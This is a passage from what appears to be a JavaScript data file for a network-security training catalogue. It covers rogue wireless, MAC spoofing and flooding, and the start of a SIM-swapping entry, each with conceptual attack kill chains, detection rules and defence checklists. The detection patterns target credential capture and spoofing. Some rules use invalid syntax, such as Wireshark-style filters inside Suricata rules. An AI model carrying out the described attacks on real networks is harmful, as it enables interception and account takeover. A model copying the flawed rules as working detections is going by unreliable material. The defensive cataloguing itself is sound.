      sigma: `title: Suspicious Captive Portal Credential Submission
id: 7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c2d
status: production
description: Detects endpoint submitting credentials to a local web server masquerading as an enterprise captive portal.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains:
            - '/login_check'
            - '/portal/auth'
            - '/wifi_login'
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1566`,
      splunk: `index=edr_logs process_name="chrome.exe" OR process_name="msedge.exe"
| search url="http://192.168.*" AND (url="*login*" OR url="*password*")
| eval Alert="CRITICAL: User Submitted Credentials on Local Captive Portal"
| table _time, computer, user, url, Alert`,
      suricata: `alert http $HOME_NET any -> any any (
    msg:"SEC-ALERT Plaintext Corporate Credentials in Captive Portal POST";
    content:"POST"; http_method;
    content:"username="; nocase; content:"password="; nocase;
    classtype:bad-unknown;
    sid:1000046;
    rev:1;
)`,
      sysmon: `# Audit active wireless network name and gateway IP
ipconfig | findstr /i "Default Gateway IPv4"`
    },
    defenseChecklist: [
      { id: "etwc_1", title: "Deploy FIDO2 Hardware Keys", tier: "Identity", desc: "Use WebAuthn/FIDO2 hardware keys that cryptographically bind credentials to genuine domain origins, rendering phishing portals useless." },
      { id: "etwc_2", title: "Mandate EAP-TLS with Strict Root CA", tier: "Wireless Infrastructure", desc: "Deploy certificate-based Wi-Fi authentication so endpoints refuse to connect to uncertified captive networks." },
      { id: "etwc_3", title: "Security Awareness Training", tier: "Human Layer", desc: "Train employees never to enter enterprise passwords into browser captive portal popups requesting Wi-Fi access." },
      { id: "etwc_4", title: "Endpoint DNS Hardening", tier: "Endpoint MDM", desc: "Enforce encrypted DNS (DoH/DoT) to enterprise resolvers to prevent local rogue AP DNS redirection." }
    ]
  },

  {
    num: 47,
    id: "wireless-sniffing",
    name: "Wireless Sniffing Attack",
    shortName: "Wireless Sniffing",
    moduleGroup: "rogue",
    module: "Rogue Wireless Device Attacks",
    category: "rogue",
    severity: "medium",
    cvss: "6.5",
    mitre: "T1040",
    primaryTargets: "802.11 Probe Requests, Unencrypted Protocols, Network Metadata",
    threatActors: "Passive Reconnaissance Operators, Intelligence Gatherers",
    summary: "Wireless Sniffing involves passive capture and decoding of 802.11 frames over the air without associating with any access point. Attackers analyze unencrypted management frames (such as Probe Requests and Beacon announcements) to map out corporate network topologies, catalog connected hardware vendors via MAC OUI lookups, and track physical movements of executive mobile devices.",
    killChain: [
      {
        step: 1,
        title: "Monitor Mode Channel Hopping",
        mitre: "T1040",
        desc: "Configuring a wireless interface to rapidly sweep all 802.11a/b/g/n/ac/ax channels."
      },
      {
        step: 2,
        title: "Probe Request Harvesting",
        mitre: "T1040",
        desc: "Capturing 802.11 Probe Request frames emitted by nearby laptops and phones searching for preferred networks."
      },
      {
        step: 3,
        title: "Target Profiling & Asset Mapping",
        mitre: "T1592",
        desc: "Correlating MAC addresses and historical SSID probe lists to fingerprint corporate employees and executive staff."
      }
    ],
    telemetry: {
      sources: [
        "Campus WIPS Sensor RF Mapping Logs",
        "Access Point Channel Utilization Metrics",
        "Physical Security Perimeter Sweeps"
      ],
      anomalies: [
        "Unusually high volume of probe requests targeting retired corporate SSIDs",
        "Presence of unassociated client MACs persisting in facility parking areas for prolonged durations",
        "Anomalous frame transmission patterns detected by RF spectrum sensors"
      ]
    },
    rules: {
      sigma: `title: High-Rate 802.11 Probe Request Harvesting
id: 8b9c0d1e-2f3a-4b5c-6d7e-8f9a0b1c2d3e
status: production
description: Detects persistent wireless probe request tracking and client fingerprinting.
logsource:
    category: wireless_sensor
detection:
    selection:
        frame_type: 'probe_request'
    timeframe: 1m
    condition: selection | count(client_mac) > 500
level: low
tags:
    - attack.reconnaissance
    - attack.t1040`,
      splunk: `index=wifi_wips frame_subtype="probe_req"
| stats count dc(ssid_probed) as distinct_ssids by client_mac
| where distinct_ssids > 15
| eval Alert="LOW: Device Emitting High Volume of Probe Requests - Passive Tracking Risk"
| table client_mac, distinct_ssids, count, Alert`,
      suricata: `alert wifi any any -> any any (
    msg:"SEC-ALERT High Volume of 802.11 Probe Requests (Wireless Reconnaissance)";
    wlan.fc.type == 0 && wlan.fc.subtype == 4; # Probe Request
    threshold: type both, track by_src, count 100, seconds 60;
    classtype:attempted-recon;
    sid:1000047;
    rev:1;
)`,
      sysmon: `# Linux terminal check for wireless networks discovered in monitor mode:
iw dev wlan0 scan | grep -i "SSID"`
    },
    defenseChecklist: [
      { id: "wsniff_1", title: "Enable MAC Address Randomization", tier: "Endpoint MDM", desc: "Enforce dynamic MAC address randomization on all corporate mobile phones and laptops during probe scans." },
      { id: "wsniff_2", title: "Purge Saved Open Wi-Fi Networks", tier: "Endpoint Policy", desc: "Configure MDM profiles to automatically delete unmanaged SSIDs from preferred network lists." },
      { id: "wsniff_3", title: "Do Not Broadcast Hidden SSIDs", tier: "Wireless Infrastructure", desc: "Avoid using hidden SSIDs, as they force client devices to continuously transmit cleartext probe requests." },
      { id: "wsniff_4", title: "Deploy RF Shielding Paint", tier: "Physical", desc: "Apply RF-attenuating paint and window film to secure high-value conference facilities from external eavesdropping." }
    ]
  },

  {
    num: 48,
    id: "rogue-dhcp",
    name: "Rogue DHCP Attack",
    shortName: "Rogue DHCP Attack",
    moduleGroup: "rogue",
    module: "Rogue Wireless Device Attacks",
    category: "rogue",
    severity: "high",
    cvss: "8.2",
    mitre: "T1557.001",
    primaryTargets: "Local Area Networks, Wireless Client Subnets, Ethernet Workstations",
    threatActors: "Local Attackers, Compromised Internal Endpoints, Red Teams",
    summary: "A Rogue DHCP Attack occurs when an unauthorized DHCP server is activated on an enterprise network segment. By replying faster than the legitimate enterprise DHCP server to DHCP Discover broadcasts, the rogue server assigns connecting clients attacker-controlled IP configurations—most critically setting the Default Gateway and DNS Server to the attacker's IP, achieving seamless Man-in-the-Middle positioning.",
    killChain: [
      {
        step: 1,
        title: "DHCP Starvation (Optional)",
        mitre: "T1498",
        desc: "Attacker floods legitimate DHCP server with thousands of fake MAC requests to exhaust the IP lease pool."
      },
      {
        step: 2,
        title: "Rogue DHCP Listener Deployment",
        mitre: "T1557.001",
        desc: "Activating a rogue DHCP service listening for broadcast DHCP Discover UDP packets on port 67."
      },
      {
        step: 3,
        title: "Malicious Gateway & DNS Assignment",
        mitre: "T1557",
        desc: "Transmitting DHCP Offers with the attacker's IP set as Option 3 (Router) and Option 6 (DNS)."
      }
    ],
    telemetry: {
      sources: [
        "Network Switch DHCP Snooping Syslog",
        "Endpoint Network Adapter Configuration Logs (Unexpected default gateway IP assignment)",
        "Network IDS (Detection of unauthorized DHCP responses on port 68)"
      ],
      anomalies: [
        "Multiple distinct DHCP servers offering IP addresses on the same VLAN",
        "Clients assigned gateway IPs outside of the authorized enterprise network schema",
        "Switch ports generating DHCP Offer packets without being marked as trusted ports"
      ]
    },
    rules: {
      sigma: `title: Unauthorized Rogue DHCP Server Offer Detected
id: 9c0d1e2f-3a4b-5c6d-7e8f-9a0b1c2d3e4f
status: production
description: Detects DHCP Offer or ACK packets originating from an unapproved IP or switch port.
logsource:
    category: network_connection
detection:
    selection:
        DestinationPort: 68
        SourcePort: 67
    filter:
        SourceIp:
            - '10.0.0.2'
            - '10.0.0.3' # Authorized DHCP servers
    condition: selection and not filter
level: critical
tags:
    - attack.credential_access
    - attack.t1557.001`,
      splunk: `index=network (sourcetype=cisco_ios "DHCP_SNOOPING-5-DHCP_OFFER_DROPPED") OR (sourcetype=zeek_dhcp message_type="OFFER" NOT src_ip IN ("10.0.0.2", "10.0.0.3"))
| eval Alert="CRITICAL: Rogue DHCP Server Detected on Network"
| table _time, src_ip, dest_ip, mac_address, Alert`,
      suricata: `alert udp any 67 -> any 68 (
    msg:"SEC-ALERT Rogue DHCP Server Response (Offer/Ack from Untrusted Source)";
    flow:from_server;
    content:"|02|"; depth:1; # Boot Reply
    # Filter out authorized corporate DHCP servers
    threshold: type both, track by_src, count 1, seconds 60;
    classtype:bad-unknown;
    sid:1000048;
    rev:1;
)`,
      sysmon: `# Inspect current assigned DHCP server on Windows
ipconfig /all | findstr /i "DHCP Server"`
    },
    defenseChecklist: [
      { id: "rdhcp_1", title: "Enable DHCP Snooping Globally", tier: "Switching", desc: "Configure DHCP Snooping on all access switches, designating only legitimate server uplinks as trusted ports." },
      { id: "rdhcp_2", title: "Pair with Dynamic ARP Inspection (DAI)", tier: "Switching", desc: "Link DAI to the DHCP snooping database to drop spoofed ARP packets from rogue gateways." },
      { id: "rdhcp_3", title: "Configure DHCP Rate Limiting", tier: "Switching", desc: "Enforce DHCP packet rate limiting on access ports to mitigate DHCP starvation attacks." },
      { id: "rdhcp_4", title: "Static IP Configuration on Servers", tier: "Infrastructure", desc: "Ensure critical servers and management appliances use hardcoded static IP and DNS configurations." }
    ]
  },

  {
    num: 49,
    id: "rogue-dns",
    name: "Rogue DNS Attack",
    shortName: "Rogue DNS Attack",
    moduleGroup: "rogue",
    module: "Rogue Wireless Device Attacks",
    category: "rogue",
    severity: "high",
    cvss: "8.3",
    mitre: "T1568.002",
    primaryTargets: "Corporate Workstations, Web Browsers, Mobile Devices",
    threatActors: "Phishing Campaigns, APT Groups, Rogue Hotspot Operators",
    summary: "A Rogue DNS Attack occurs when an adversary manipulates the domain name resolution process for target endpoints. Often distributed via rogue DHCP servers, malicious local proxy settings, or hosts file modification, the rogue DNS resolver intercepts domain queries and answers with IP addresses pointing to attacker-controlled phishing servers or malware distribution hosts.",
    killChain: [
      {
        step: 1,
        title: "DNS Resolver Configuration Tampering",
        mitre: "T1568.002",
        desc: "Injecting malicious DNS server IP addresses into target network adapters or rogue DHCP settings."
      },
      {
        step: 2,
        title: "Selective Domain Interception",
        mitre: "T1568.002",
        desc: "Rogue DNS resolver passes legitimate queries through while intercepting targeted corporate domain lookups."
      },
      {
        step: 3,
        title: "Phishing Redirection & Session Hijacking",
        mitre: "T1112",
        desc: "Client navigates to portal.company.com and is silently routed to an attacker server hosting a credential harvester."
      }
    ],
    telemetry: {
      sources: [
        "Endpoint Network Adapter Event Logs (Modifications to primary/secondary DNS server settings)",
        "DNS Egress Firewall Logs (Outbound UDP/TCP port 53 traffic to unvetted external resolvers)",
        "EDR Process Network Events (Processes querying untrusted internal DNS resolvers)"
      ],
      anomalies: [
        "Endpoint sending DNS queries to an unrecognized IP address rather than enterprise Domain Controllers",
        "Sudden surge in DNS NXDOMAIN or SERVFAIL responses across multiple endpoints",
        "Public domains resolving to internal RFC1918 addresses or foreign ASNs"
      ]
    },
    rules: {
      sigma: `title: Unauthorized Outbound DNS Resolution
id: 0d1e2f3a-4b5c-6d7e-8f9a-0b1c2d3e4f5a
status: production
description: Detects endpoint establishing DNS queries to unauthorized external DNS servers.
logsource:
    category: network_connection
detection:
    selection:
        DestinationPort: 53
    filter:
        DestinationIp:
            - '10.0.0.10'
            - '10.0.0.11' # Approved internal DNS servers
    condition: selection and not filter
level: high
tags:
    - attack.command_and_control
    - attack.t1568.002`,
      splunk: `index=firewall dest_port=53 NOT dest_ip IN ("10.0.0.10", "10.0.0.11")
| stats count by src_ip, dest_ip
| where count > 10
| eval Alert="HIGH: Endpoint Querying Unauthorized / Rogue DNS Server"
| table _time, src_ip, dest_ip, count, Alert`,
      suricata: `alert dns $HOME_NET any -> !$DNS_SERVERS 53 (
    msg:"SEC-ALERT DNS Query to Unauthorized External Resolver";
    classtype:policy-violation;
    sid:1000049;
    rev:1;
)`,
      sysmon: `# Verify active DNS server addresses via PowerShell:
Get-DnsClientServerAddress -AddressFamily IPv4 | Format-Table InterfaceAlias, ServerAddresses`
    },
    defenseChecklist: [
      { id: "rdns_1", title: "Block Outbound Port 53 on Perimeter", tier: "Firewall", desc: "Block all direct outbound UDP/TCP 53 requests at perimeter firewalls, permitting only approved internal resolvers." },
      { id: "rdns_2", title: "Deploy DNSSEC Validation", tier: "DNS Architecture", desc: "Enforce cryptographic DNSSEC validation on all enterprise recursive resolvers to reject forged DNS records." },
      { id: "rdns_3", title: "Lock DNS Settings via MDM / GPO", tier: "Endpoint Policy", desc: "Prevent non-administrative users and DHCP options from overwriting predefined corporate DNS resolvers." },
      { id: "rdns_4", title: "Implement DNS Filtering & Umbrella", tier: "Cloud Security", desc: "Route corporate traffic through secure DNS inspection gateways (Cisco Umbrella, Cloudflare Zero Trust)." }
    ]
  },

  // =========================================================================
  // MODULE 6: MAC SPOOFING ATTACKS (50 - 54)
  // =========================================================================
  {
    num: 50,
    id: "mac-spoofing",
    name: "MAC Spoofing Attack",
    shortName: "MAC Spoofing",
    moduleGroup: "mac",
    module: "MAC Spoofing Attacks",
    category: "mac",
    severity: "medium",
    cvss: "6.5",
    mitre: "T1036.007",
    primaryTargets: "Local Area Networks, Captive Portal Gateways, MAC Filtered Wi-Fi",
    threatActors: "Local Network Attackers, Internal Insiders, Penetration Testers",
    summary: "MAC Spoofing is the practice of modifying the factory-assigned Media Access Control address of a physical or virtual network interface card (NIC). Attackers overwrite their MAC address using OS commands or driver configuration to masquerade as an authorized device, bypass MAC address filtering lists on wireless routers, or circumvent time-limited captive portal paywalls.",
    killChain: [
      {
        step: 1,
        title: "Authorized MAC Address Discovery",
        mitre: "T1040",
        desc: "Monitoring local broadcast traffic or Wi-Fi frames to identify active, authorized device hardware MAC addresses."
      },
      {
        step: 2,
        title: "Network Interface MAC Overwrite",
        mitre: "T1036.007",
        desc: "Changing the locally administered address (LAA) of the attacker's network card using software utilities."
      },
      {
        step: 3,
        title: "ACL Bypass & Access Acquisition",
        mitre: "T1556",
        desc: "Connecting to the network using the cloned MAC address to inherit authorized access privileges."
      }
    ],
    telemetry: {
      sources: [
        "Network Switch Syslog (MAC flapping events between switch ports)",
        "Wireless Controller Roaming Logs (Same MAC associating from two disparate physical radios)",
        "Endpoint Network Interface Configuration Events"
      ],
      anomalies: [
        "Identical MAC address appearing simultaneously on two different physical switch ports",
        "MAC address associated with a legacy vendor hardware OUI exhibiting modern OS traffic fingerprints",
        "Rapid switching of MAC address on a single endpoint network interface"
      ]
    },
    rules: {
      sigma: `title: MAC Flapping Detected Across Multiple Switch Interfaces
id: 1e2f3a4b-5c6d-7e8f-9a0b-1c2d3e4f5a6b
status: production
description: Detects the same MAC address rapidly appearing on different switch ports indicating MAC spoofing.
logsource:
    category: network_switch
detection:
    selection:
        message|contains:
            - 'Host moved'
            - 'MAC flapping'
    condition: selection
level: medium
tags:
    - attack.defense_evasion
    - attack.t1036.007`,
      splunk: `index=network sourcetype=switch_syslog "MAC flapping" OR "Host moved"
| stats count by mac_address, interface
| where count > 5
| eval Alert="WARNING: MAC Flapping Detected - Possible MAC Spoofing in Progress"
| table _time, mac_address, interface, count, Alert`,
      suricata: `alert arp any any -> any any (
    msg:"SEC-ALERT Duplicate MAC Address Detected Across Multiple Ports";
    threshold: type both, track by_src, count 20, seconds 10;
    classtype:bad-unknown;
    sid:1000050;
    rev:1;
)`,
      sysmon: `# Inspect network adapter physical address in Windows:
getmac /v /fo table`
    },
    defenseChecklist: [
      { id: "mspoof_1", title: "Deploy 802.1X Instead of MAC Filtering", tier: "Access Control", desc: "Replace fragile MAC address whitelists with 802.1X certificate-based authentication across wired and wireless networks." },
      { id: "mspoof_2", title: "Enable Switch Port Security", tier: "Switching", desc: "Bind authorized MAC addresses statically to physical switch ports using sticky MAC learning." },
      { id: "mspoof_3", title: "Enable DAI & DHCP Snooping", tier: "Switching", desc: "Drop packets whose MAC and IP addresses do not match active DHCP snooping database bindings." },
      { id: "mspoof_4", title: "Device Profiling & Fingerprinting", tier: "NAC", desc: "Utilize NAC profiling to inspect DHCP option signatures and user-agents to detect OS/vendor mismatches." }
    ]
  },

  {
    num: 51,
    id: "mac-flooding",
    name: "MAC Flooding Attack",
    shortName: "MAC Flooding",
    moduleGroup: "mac",
    module: "MAC Spoofing Attacks",
    category: "mac",
    severity: "high",
    cvss: "7.8",
    mitre: "T1499",
    primaryTargets: "Enterprise Ethernet Switches, Campus LANs, Multi-Tenant Switches",
    threatActors: "Local Attackers, Malicious Insiders, Penetration Testers",
    summary: "MAC Flooding targets the Content Addressable Memory (CAM) table of Ethernet switches. The attacker transmits thousands of Ethernet frames per second with randomized, fabricated source MAC addresses. Once the switch's CAM table memory is exhausted, the switch fails open—reverting to legacy hub behavior and broadcasting all incoming unicast frames out of every port, allowing the attacker to sniff all intra-VLAN traffic.",
    killChain: [
      {
        step: 1,
        title: "CAM Table Stress Probing",
        mitre: "T1595",
        desc: "Attacker gauges switch forwarding performance and checks for active port security limits."
      },
      {
        step: 2,
        title: "Randomized MAC Frame Injection",
        mitre: "T1499",
        desc: "Flooding the switch port with tens of thousands of frames per second bearing randomized source MAC addresses."
      },
      {
        step: 3,
        title: "Switch Fail-Open & Traffic Sniffing",
        mitre: "T1040",
        desc: "CAM table overflows; switch broadcasts all unicast packets across all ports, enabling passive traffic capture."
      }
    ],
    telemetry: {
      sources: [
        "Switch Resource Metrics (CAM/MAC table utilization spikes near 100%)",
        "Switch Port Error Logs (Port Security MAC violation shutdowns)",
        "Network Egress Packet Volume per Interface"
      ],
      anomalies: [
        "CAM table entries leaping from normal baselines (e.g. 500 entries) to hardware maximum (e.g. 64,000) in seconds",
        "Single physical switch port registered with thousands of distinct MAC addresses",
        "Massive surge in unicast packet flooding across interfaces with no corresponding destinations"
      ]
    },
    rules: {
      sigma: `title: Switch CAM Table Exhaustion / MAC Flooding
id: 2f3a4b5c-6d7e-8f9a-0b1c-2d3e4f5a6b7c
status: production
description: Detects an abnormal volume of new MAC address registrations on a single switch port within seconds.
logsource:
    category: network_switch
detection:
    selection:
        message|contains:
            - 'MAC table full'
            - 'CAM overflow'
            - 'SECURITY_VIOLATION'
    condition: selection
level: critical
tags:
    - attack.impact
    - attack.t1499`,
      splunk: `index=network sourcetype=switch_syslog "CAM table full" OR "MAC table overflow"
| eval Alert="CRITICAL: Switch CAM Table Exhaustion in Progress"
| table _time, host, message, Alert`,
      suricata: `alert ether any any -> any any (
    msg:"SEC-ALERT High-Rate Randomized MAC Generation (MAC Flooding Attack)";
    threshold: type both, track by_src, count 1000, seconds 1;
    classtype:denial-of-service;
    sid:1000051;
    rev:1;
)`,
      sysmon: `# Query switch MAC address table count
show mac address-table count`
    },
    defenseChecklist: [
      { id: "mflood_1", title: "Enforce Switch Port Security", tier: "Switching", desc: "Limit the maximum number of secure MAC addresses on an access port to 1 or 2, with action set to shutdown upon violation." },
      { id: "mflood_2", title: "Enable MAC Limit per VLAN", tier: "Switching", desc: "Configure global MAC table limits per VLAN to prevent a compromised port from exhausting whole-switch memory." },
      { id: "mflood_3", title: "Deploy 802.1X NAC", tier: "Access Control", desc: "Require RADIUS/EAP authentication before switch ports transition to the forwarding state." },
      { id: "mflood_4", title: "Rate-Limit Broadcast & Multicast", tier: "Switching", desc: "Apply Storm Control on switch ports to restrict excessive packet rates." }
    ]
  },

  {
    num: 52,
    id: "mac-impersonation",
    name: "MAC Address Impersonation",
    shortName: "MAC Impersonation",
    moduleGroup: "mac",
    module: "MAC Spoofing Attacks",
    category: "mac",
    severity: "high",
    cvss: "7.7",
    mitre: "T1036.007",
    primaryTargets: "Enterprise Printers, VoIP Phones, Conference Room Consoles",
    threatActors: "Advanced Physical Intruders, Insider Threats, Red Teams",
    summary: "MAC Address Impersonation is a targeted spoofing technique where an adversary explicitly identifies and assumes the identity of a high-value network device (such as a networked printer, security camera, or IP conference phone). Because these devices are frequently exempted from strict multi-factor authentication or 802.1X controls via MAC whitelisting, impersonating them provides unauthorized network access.",
    killChain: [
      {
        step: 1,
        title: "Target Asset Identification",
        mitre: "T1040",
        desc: "Attacker inspects physical asset labels or sniffs LLDP/CDP packets to identify printer or VoIP MAC addresses."
      },
      {
        step: 2,
        title: "Device Disconnection or Standby Timing",
        mitre: "T1498",
        desc: "Unplugging the target device or waiting for off-hours when the device enters low-power standby mode."
      },
      {
        step: 3,
        title: "Impersonation & Network Entry",
        mitre: "T1036.007",
        desc: "Configuring the attacker machine with the cloned MAC address and plugging into the authentic switch port."
      }
    ],
    telemetry: {
      sources: [
        "Network Access Control (NAC) Profiler Logs",
        "Switch DHCP Snooping Database Events",
        "EDR Endpoint Inventory Telemetry"
      ],
      anomalies: [
        "Device claiming to be a Xerox printer requesting IP with a Windows or Linux DHCP option fingerprint",
        "Unexpected HTTP user-agent or SSH connection originating from an IP assigned to an IP phone",
        "Change in link state on a critical device switch port followed by abnormal outbound protocol traffic"
      ]
    },
    rules: {
      sigma: `title: MAC Impersonation - Device Profiling Mismatch
id: 3a4b5c6d-7e8f-9a0b-1c2d-3e4f5a6b7c8d
status: production
description: Detects device claiming a known MAC address exhibiting network behaviors inconsistent with its asset profile.
logsource:
    category: nac
detection:
    selection:
        device_profile: 'Printer'
        outbound_traffic_type:
            - 'SSH'
            - 'RDP'
            - 'PowerShell'
    condition: selection
level: high
tags:
    - attack.defense_evasion
    - attack.t1036.007`,
      splunk: `index=nac_logs device_type="VoIP Phone" OR device_type="Printer"
| search dest_port IN (22, 3389, 445)
| eval Alert="CRITICAL: Printer/VoIP MAC Address Establishing Administrative Connections"
| table _time, src_ip, mac_address, device_type, dest_ip, dest_port, Alert`,
      suricata: `alert tcp $PRINTER_IPS any -> any [22,3389] (
    msg:"SEC-ALERT Printer IP Originating Outbound Management Connection (Probable Impersonation)";
    flow:from_client;
    classtype:bad-unknown;
    sid:1000052;
    rev:1;
)`,
      sysmon: `# Inspect CDP/LLDP neighbors on switch port
show cdp neighbors detail`
    },
    defenseChecklist: [
      { id: "mimp_1", title: "Certificate-Based Device Identity", tier: "NAC", desc: "Deploy 802.1X EAP-TLS with manufacturer-installed device certificates (IDevID) rather than MAC-only whitelists." },
      { id: "mimp_2", title: "Continuous Behavioral Profiling", tier: "NAC / NDR", desc: "Enforce behavioral monitoring that alerts if a printer or VoIP phone attempts SSH, RDP, or lateral SMB traffic." },
      { id: "mimp_3", title: "Microsegmentation & Strict ACLs", tier: "Network Architecture", desc: "Place printers and IoT endpoints on isolated VLANs with strict outbound egress firewalls." },
      { id: "mimp_4", title: "Cable Lock Hardware", tier: "Physical Security", desc: "Use physical RJ45 port locks and secure enclosures to prevent unauthorized unplugging of devices." }
    ]
  },

  {
    num: 53,
    id: "mac-auth-bypass",
    name: "MAC-Based Authentication Bypass (MAB Bypass)",
    shortName: "MAB Bypass",
    moduleGroup: "mac",
    module: "MAC Spoofing Attacks",
    category: "mac",
    severity: "high",
    cvss: "7.6",
    mitre: "T1556",
    primaryTargets: "802.1X Networks with MAB Fallback, Enterprise Switches, Smart Building Controllers",
    threatActors: "Penetration Testers, Physical Red Teams, Skilled Insiders",
    summary: "MAC Authentication Bypass (MAB) is a legacy fallback mechanism deployed on 802.1X networks to accommodate legacy devices (like barcode scanners, printers, and medical devices) that lack 802.1X supplicants. Attackers bypass network admission controls by capturing the MAC address of an authorized MAB device and cloning it on their rogue endpoint, causing the RADIUS server to grant network access.",
    killChain: [
      {
        step: 1,
        title: "MAB Fallback Reconnaissance",
        mitre: "T1046",
        desc: "Attacker connects to an 802.1X enabled port and observes the authentication timeout leading to MAB fallback."
      },
      {
        step: 2,
        title: "Authorized MAB Device Harvesting",
        mitre: "T1040",
        desc: "Sniffing broadcast traffic to record MAC addresses belonging to devices authenticated via MAB."
      },
      {
        step: 3,
        title: "RADIUS Bypass & Network Access",
        mitre: "T1556",
        desc: "Spoofing the harvested MAC address; switch forwards the MAC to RADIUS, which grants network admission."
      }
    ],
    telemetry: {
      sources: [
        "RADIUS Server Authentication Logs (Authentication-Type: MAB events)",
        "Switch 802.1X State Machine Event Logs",
        "NAC Profiling Telemetry"
      ],
      anomalies: [
        "A MAB-authenticated device requesting IP address with a completely different DHCP vendor class ID",
        "MAB authentication occurring on a switch port normally reserved for user workstations",
        "Simultaneous RADIUS accounting records active for the same MAC on two different switches"
      ]
    },
    rules: {
      sigma: `title: Suspicious MAC Authentication Bypass (MAB) with Profiling Anomaly
id: 4b5c6d7e-8f9a-0b1c-2d3e-4f5a6b7c8d9e
status: production
description: Detects MAB authentication where the endpoint OS does not match the registered device profile.
logsource:
    category: radius
detection:
    selection:
        AuthType: 'MAB'
        ProfileMismatch: true
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1556`,
      splunk: `index=radius auth_type="MAB"
| lookup asset_inventory mac_address OUTPUT expected_vendor, expected_os
| where current_os != expected_os
| eval Alert="HIGH: MAB Bypass Detected - Operating System Mismatch"
| table _time, user, mac_address, expected_os, current_os, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Unauthenticated Host Passed via MAB (Unexpected User Agent)";
    content:"User-Agent: Mozilla"; http_header;
    classtype:policy-violation;
    sid:1000053;
    rev:1;
)`,
      sysmon: `# View 802.1X / MAB state on switch port
show authentication sessions interface GigabitEthernet0/2 details`
    },
    defenseChecklist: [
      { id: "mab_1", title: "Mandate Multi-Factor Profiling with MAB", tier: "NAC Policy", desc: "Require MAB to correlate MAC addresses with DHCP Option 55/60 signatures, LLDP telemetry, and active ports." },
      { id: "mab_2", title: "Restrict MAB to Isolated Subnets", tier: "Network Architecture", desc: "Assign MAB authenticated devices to restricted VLANs with zero access to corporate active directory domains." },
      { id: "mab_3", title: "Deploy Hardware 802.1X Supplicants", tier: "Device Management", desc: "Upgrade IoT firmware or install hardware security bridges to enable authentic 802.1X on legacy assets." },
      { id: "mab_4", title: "Periodic Re-Authentication", tier: "Switching", desc: "Configure short re-authentication timers and active health checks on all MAB sessions." }
    ]
  },

  {
    num: 54,
    id: "cam-table-overflow",
    name: "CAM Table Overflow",
    shortName: "CAM Table Overflow",
    moduleGroup: "mac",
    module: "MAC Spoofing Attacks",
    category: "mac",
    severity: "high",
    cvss: "7.5",
    mitre: "T1499",
    primaryTargets: "Hardware Core & Distribution Switches, Layer 2 Bridges",
    threatActors: "Malicious Insiders, Penetration Testers, Local Attackers",
    summary: "CAM (Content Addressable Memory) Table Overflow is an attack that specifically targets the hardware memory used by network switches to maintain MAC-address-to-port mapping tables. By rapidly bombarding the switch with tens of thousands of fabricated source MACs per second, the table's fixed capacity is exceeded. Unable to store new mappings, the switch fails open and broadcasts all unicast frames to all ports.",
    killChain: [
      {
        step: 1,
        title: "Hardware CAM Limit Fingerprinting",
        mitre: "T1595",
        desc: "Determining switch hardware model and maximum CAM table capacity (e.g. 16K, 32K, 64K entries)."
      },
      {
        step: 2,
        title: "High-Volume Frame Flooding",
        mitre: "T1499",
        desc: "Pumping high-velocity Ethernet packets with generated random MAC addresses into the access switch port."
      },
      {
        step: 3,
        title: "Unicast Flooding Interception",
        mitre: "T1040",
        desc: "Switch memory saturates; attacker sniffs sensitive communications passing between unrelated ports."
      }
    ],
    telemetry: {
      sources: [
        "Switch CPU & Memory Utilization Metrics",
        "Switch Syslog (CAM allocation failure alerts)",
        "Unicast Flood Traffic Rate Monitors"
      ],
      anomalies: [
        "Total utilization of switch CAM memory reaching 100% capacity in seconds",
        "Spike in switch CPU utilization caused by excessive hardware-to-software forwarding interrupts",
        "Outbound unicast packets appearing on ports where the destination host is not physically attached"
      ]
    },
    rules: {
      sigma: `title: Switch CAM Memory Exhaustion Alert
id: 5c6d7e8f-9a0b-1c2d-3e4f-5a6b7c8d9e0f
status: production
description: Detects switch hardware alerts notifying that CAM memory allocation has reached capacity.
logsource:
    category: network_switch
detection:
    selection:
        message|contains:
            - 'FIB-4-CAM_FULL'
            - 'MATM-4-CAM_FULL'
            - 'MAC table threshold exceeded'
    condition: selection
level: critical
tags:
    - attack.impact
    - attack.t1499`,
      splunk: `index=network sourcetype=switch_syslog "*CAM_FULL*" OR "*TABLE_FULL*"
| eval Alert="CRITICAL: Hardware CAM Table Overflow on Core Switch"
| table _time, host, message, Alert`,
      suricata: `alert ether any any -> any any (
    msg:"SEC-ALERT Extreme Ethernet Frame Generation (CAM Overflow Trigger)";
    threshold: type both, track by_src, count 2500, seconds 1;
    classtype:denial-of-service;
    sid:1000054;
    rev:1;
)`,
      sysmon: `# Query switch hardware memory utilization:
show platform hardware memory`
    },
    defenseChecklist: [
      { id: "cam_1", title: "Enable Port Security with Shutdown", tier: "Switching", desc: "Configure switchport port-security violation shutdown on all end-user access interfaces." },
      { id: "cam_2", title: "Set Static CAM Table Sizes", tier: "Switching", desc: "Restrict dynamic MAC address learning thresholds per VLAN on distribution and core switches." },
      { id: "cam_3", title: "Implement Storm Control", tier: "Switching", desc: "Deploy storm control for unicast, broadcast, and multicast traffic on all user-facing edge ports." },
      { id: "cam_4", title: "Use Modern SDN / Microsegmentation", tier: "Network Architecture", desc: "Deploy modern software-defined networking (Cisco ACI, VMware NSX) which decouples forwarding from legacy CAM." }
    ]
  },

  // =========================================================================
  // MODULE 7: MOBILE ATTACKS (55 - 59)
  // =========================================================================
  {
    num: 55,
    id: "sim-swapping",
    name: "SIM Swapping Attack",
    shortName: "SIM Swapping",
    moduleGroup: "mobile",
    module: "Mobile Attacks",
    category: "mobile",
    severity: "critical",
    cvss: "8.9",
    mitre: "T1584.004, T1111",
    primaryTargets: "Corporate Executives, IT Administrators, Crypto Accounts, High-Net-Worth Individuals",
    threatActors: "Scattered Spider, Cyber Extortionists, Organized Financial Crime Groups",
    summary: "SIM Swapping (also known as SIM hijacking) is an account takeover technique where an attacker convinces a mobile cellular carrier (via social engineering, bribed retail insiders, or phishing) to transfer a victim's phone number to a new SIM card owned by the attacker. Once active, all SMS messages, phone calls, and crucially SMS-based 2FA one-time verification passcodes are routed directly to the attacker's device.",
    killChain: [
      {
        step: 1,
        title: "Victim OSINT & Identity Harvesting",
        mitre: "T1589",
        desc: "Collecting victim's full legal name, mobile number, date of birth, and carrier details via data breaches."
      },
      {
        step: 2,
        title: "Carrier Representative Social Engineering",
        mitre: "T1584.004",
